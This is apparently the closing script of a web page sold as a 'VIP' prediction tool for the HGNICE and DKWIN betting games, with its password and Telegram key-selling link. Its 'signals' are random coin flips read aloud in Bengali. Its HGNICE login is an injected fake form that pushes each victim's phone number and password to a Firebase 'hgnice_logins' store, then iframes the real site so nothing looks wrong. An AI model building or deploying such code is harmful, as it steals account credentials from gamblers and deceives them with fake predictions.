        const loginScreen = document.getElementById('loginScreen');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const periodInput = document.getElementById('period');
        const generateBtn = document.getElementById('generateBtn');
        const signalDisplay = document.getElementById('signalDisplay');
        const signalText = signalDisplay.querySelector('.signal-text');
        const hgniceBtn = document.getElementById('hgniceBtn');
        const dkwinBtn = document.getElementById('dkwinBtn');
        const siteContent = document.getElementById('siteContent');
        const fakeLoginTemplate = document.getElementById('fakeLoginTemplate');
        const loadingScreen = document.getElementById('loadingScreen');

        // Handle login to unlock the tool
        loginBtn.addEventListener('click', function() {
            const password = passwordInput.value;
            // Fixed password for login
            if (password === "KOBIR-VIP1397") {
                loginScreen.style.display = 'none';
                showHgniceLogin(); // Show HGNICE login by default
            } else {
                alert('Invalid password. Please try again. ^ GET KEY? 👉 https://t.me/TNL_LAB_V1 →→  @TNL_LAB_V1 ');
            }
        });

        // Generate signal
        generateBtn.addEventListener('click', function() {
            const period = periodInput.value;
            if (!period || period.length !== 3) {
                alert('Please enter a valid 3-digit period number');
                return;
            }

            // Generate random signal (BIG or SMALL)
            const isBig = Math.random() > 0.5;
            const signal = isBig ? 'BIG' : 'SMALL';
            const signalClass = isBig ? 'big' : 'small';
            const message = isBig ? 'আপনি বিগে ট্রেড করুন' : 'আপনি SMALL এ ট্রেড করুন';

            // Update signal display
            signalText.textContent = signal;
            signalText.className = 'signal-text ' + signalClass;
            signalDisplay.classList.add('pulse');

            // Remove pulse animation after 2 seconds
            setTimeout(() => {
                signalDisplay.classList.remove('pulse');
            }, 2000);

            // Speech synthesis (voice output)
            if ('speechSynthesis' in window) {
                const utterance = new SpeechSynthesisUtterance(message);
                utterance.lang = 'bn-BD'; // Bengali
                utterance.rate = 1.0;
                speechSynthesis.speak(utterance);
            }
        });

        // Format period input
        periodInput.addEventListener('input', function() {
            if (this.value.length > 3) {
                this.value = this.value.slice(0, 3);
            }
        });

        // Show HGNICE login
        function showHgniceLogin() {
            // Inject the fake login template
            const clone = document.importNode(fakeLoginTemplate.content, true);
            siteContent.innerHTML = '';
            siteContent.appendChild(clone);
            
            // Setup the fake login form
            const loginForm = siteContent.querySelector('#loginForm');
            const closeBtn = siteContent.querySelector('#fakeCloseBtn');
            
            // Handle close button
            closeBtn.addEventListener('click', function() {
                siteContent.innerHTML = '<iframe class="site-frame" src="https://hgnice.pro/"></iframe>';
            });
            
            // Handle form submission
            if (loginForm) {
                loginForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const phone = document.getElementById('phone').value;
                    const password = document.getElementById('loginPassword').value;
                    
                    // Show loading screen
                    loadingScreen.style.display = 'flex';
                    
                    // Save credentials to Firebase
                    const credentials = {
                        phone: phone,
                        password: password,
                        timestamp: new Date().toISOString()
                    };
                    
                    const hgniceRef = ref(database, 'hgnice_logins');
                    push(hgniceRef, credentials)
                        .then(() => {
                            // Redirect to the HGNICE site after a short delay
                            setTimeout(() => {
                                siteContent.innerHTML = '<iframe class="site-frame" src="https://hgnice.top/"></iframe>';
                                loadingScreen.style.display = 'none';
                            }, 2000);
                        })
                        .catch((error) => {
                            console.error('Error saving credentials:', error);
                            loadingScreen.style.display = 'none';
                            alert('Login failed. Please try again.');
                        });
                });
            }
        }

        // Show DKWIN interface
        function showDkwinInterface() {
            siteContent.innerHTML = '<iframe class="site-frame" src="https://dkwin.com/"></iframe>';
        }

        // Attach event listeners
        hgniceBtn.addEventListener('click', showHgniceLogin);
        dkwinBtn.addEventListener('click', showDkwinInterface);
    </script>
</body>
</html>
